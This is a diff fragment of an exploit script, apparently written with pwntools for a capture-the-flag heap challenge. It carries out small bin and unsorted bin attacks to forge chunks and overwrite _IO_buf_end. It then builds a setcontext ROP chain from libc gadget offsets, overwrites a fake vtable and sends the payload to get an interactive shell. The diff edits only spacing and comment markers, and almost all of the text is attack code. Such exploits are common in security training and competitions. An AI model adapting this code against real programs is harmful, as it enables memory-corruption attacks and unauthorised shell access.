@@ -74,6 +74,7 @@ p.sendlineafter(': ','n');sleep(t)
 delete(str(main_arena_88))
 
 # small bin attack + unsorted bin attack
+
 io_buf_end = libc_base + 3950880
 add(p64(main_arena_88)+p64(heap_base+0x1a0))		# default[4]   : fake chunk a
 make(p64(heap_base+0x40)[:7],str(heap_base+0x230),[])	# fake chunk b ; 0x1a0
@@ -87,12 +88,16 @@ make('e'*4,6,[])		 # mixed id = 9 : [io_buf_end] = main_arena_88
 
 # setcontext ROP
 ret = libc_base + 0x937
+
+
 '''
 pop_rdi = libc_base + 0x21102
 pop_rsi = libc_base + 0x202e8
 pop_rdx = libc_base + 0x1b92
 pop_rax = libc_base + 0x33544
 syscall = libc_base + 0xf727b
+'''
+
 '''
 pop_rdi = libc_base + 0x0000000000021112
 pop_rsi = libc_base + 0x00000000000202f8
@@ -138,7 +143,7 @@ pay += rop
 pay += p64(setcontext_53)*20	# fake vtable overwrited setcontext gadget
 raw_input()
 p.send(pay)
-
+'''
 p.interactive()
 
 
